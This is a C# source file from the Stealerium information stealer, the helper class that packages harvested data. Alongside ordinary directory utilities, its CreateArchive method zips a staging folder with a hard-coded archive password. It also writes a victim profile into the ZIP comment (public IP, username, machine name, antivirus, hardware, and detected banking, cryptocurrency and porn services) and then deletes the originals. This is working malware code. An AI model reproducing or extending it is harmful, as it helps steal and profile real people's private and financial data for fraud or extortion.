using System;
using System.IO;
using System.Linq;
using System.Text;
using Ionic.Zip;
using Ionic.Zlib;
using Stealerium.Modules.Implant;
using Stealerium.Target.System;

namespace Stealerium.Helpers
{
    /// <summary>
    /// The Filemanager class provides file management utilities such as recursive deletion,
    /// directory copying, directory size calculation, and archive creation.
    /// </summary>
    internal sealed class Filemanager
    {
        /// <summary>
        /// Recursively deletes a directory and all its subdirectories.
        /// </summary>
        /// <param name="path">The path of the directory to delete.</param>
        public static void RecursiveDelete(string path)
        {
            var baseDir = new DirectoryInfo(path);

            // If directory doesn't exist, return
            if (!baseDir.Exists) return;

            // Recursively delete all subdirectories
            foreach (var dir in baseDir.GetDirectories())
            {
                RecursiveDelete(dir.FullName);
            }

            // Delete the base directory itself
            baseDir.Delete(true);
        }

        /// <summary>
        /// Copies a directory and all its contents to a new location.
        /// </summary>
        /// <param name="sourceFolder">The source folder path to copy from.</param>
        /// <param name="destFolder">The destination folder path to copy to.</param>
        public static void CopyDirectory(string sourceFolder, string destFolder)
        {
            // Ensure the destination directory exists
            if (!Directory.Exists(destFolder))
            {
                Directory.CreateDirectory(destFolder);
            }

            // Copy all files in the current directory
            var files = Directory.GetFiles(sourceFolder);
            foreach (var file in files)
            {
                var fileName = Path.GetFileName(file);
                var destFile = Path.Combine(destFolder, fileName);
                File.Copy(file, destFile);
            }

            // Recursively copy all subdirectories
            var folders = Directory.GetDirectories(sourceFolder);
            foreach (var folder in folders)
            {
                var folderName = Path.GetFileName(folder);
                var destFolderPath = Path.Combine(destFolder, folderName);
                CopyDirectory(folder, destFolderPath);
            }
        }

        /// <summary>
        /// Calculates the size of a directory by summing the sizes of all its files and subdirectories.
        /// </summary>
        /// <param name="path">The path of the directory.</param>
        /// <returns>The total size of the directory in bytes.</returns>
        public static long DirectorySize(string path)
        {
            var dirInfo = new DirectoryInfo(path);

            // Sum the sizes of all files in the directory
            var fileSizeSum = dirInfo.GetFiles().Sum(file => file.Length);

            // Recursively sum the sizes of all subdirectories
            var dirSizeSum = dirInfo.GetDirectories().Sum(subDir => DirectorySize(subDir.FullName));

            return fileSizeSum + dirSizeSum;
        }

        /// <summary>
        /// Creates a compressed archive (ZIP) of a specified directory.
        /// Optionally sets a password on the archive.
        /// </summary>
        /// <param name="directory">The directory to compress into an archive.</param>
        /// <param name="setPassword">Whether to set a password for the archive. Default is true.</param>
        /// <returns>The path to the created ZIP archive.</returns>
        public static string CreateArchive(string directory, bool setPassword = true)
        {
            if (!Directory.Exists(directory))
            {
                throw new DirectoryNotFoundException($"The directory '{directory}' does not exist.");
            }

            // Create the ZIP file with best compression level
            using (var zip = new ZipFile(Encoding.UTF8))
            {
                zip.CompressionLevel = CompressionLevel.BestCompression;

                // Add system and hardware information in the comment section
                zip.Comment = "" +
                              $"\nStealerium {Config.Version} - coded by @kgnfth with Love <3" +
                              "\n" +
                              "\n== System Info ==" +
                              $"\nIP: {SystemInfo.GetPublicIpAsync()}" +
                              $"\nDate: {SystemInfo.Datenow}" +
                              $"\nUsername: {SystemInfo.Username}" +
                              $"\nCompName: {SystemInfo.Compname}" +
                              $"\nLanguage: {SystemInfo.Culture}" +
                              $"\nAntivirus: {SystemInfo.GetAntivirus()}" +
                              "\n" +
                              "\n== Hardware ==" +
                              $"\nCPU: {SystemInfo.GetCpuName()}" +
                              $"\nGPU: {SystemInfo.GetGpuName()}" +
                              $"\nRAM: {SystemInfo.GetRamAmount()}" +
                              $"\nPower: {SystemInfo.GetBattery()}" +
                              $"\nScreen: {SystemInfo.ScreenMetrics()}" +
                              "\n" +
                              "\n== Domains ==" +
                              Counter.GetLValue("Banking services", Counter.DetectedBankingServices, '-') +
                              Counter.GetLValue("Cryptocurrency services", Counter.DetectedCryptoServices, '-') +
                              Counter.GetLValue("Porn websites", Counter.DetectedPornServices, '-') +
                              "\n";

                // Set the password if needed
                if (setPassword)
                {
                    zip.Password = StringsCrypt.ArchivePassword;
                }

                // Add the directory to the ZIP archive
                zip.AddDirectory(directory);

                // Save the ZIP archive
                var zipPath = directory + ".zip";
                zip.Save(zipPath);

                // Recursively delete the original directory
                RecursiveDelete(directory);

                // Log the completion of the compression
                Logging.Log($"Archive '{new DirectoryInfo(directory).Name}' compression completed");

                return zipPath;
            }
        }
    }
}
